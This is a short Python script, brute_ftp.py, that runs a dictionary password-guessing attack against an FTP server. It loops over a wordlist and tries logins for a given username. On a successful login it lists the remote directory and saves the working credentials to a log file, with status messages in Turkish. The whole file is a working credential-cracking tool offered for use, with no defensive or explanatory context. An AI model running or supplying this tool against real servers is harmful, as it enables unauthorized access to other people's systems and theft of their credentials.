# brute_ftp.py
from ftplib import FTP, error_perm

def ftp_brute_force(host, username, wordlist_file, port=21):
    with open(wordlist_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        try:
            ftp = FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(username, password)
            print(f"[✓] Giriş başarılı: {username}:{password}")
            ftp.retrlines('LIST')
            with open("ftp_success.log", "a") as log:
                log.write(f"{username}:{password} @ {host}\n")
            ftp.quit()
            break
        except error_perm:
            print(f"[-] Hatalı parola: {password}")
        except Exception as e:
            print(f"[!] Hata oluştu: {str(e)}")
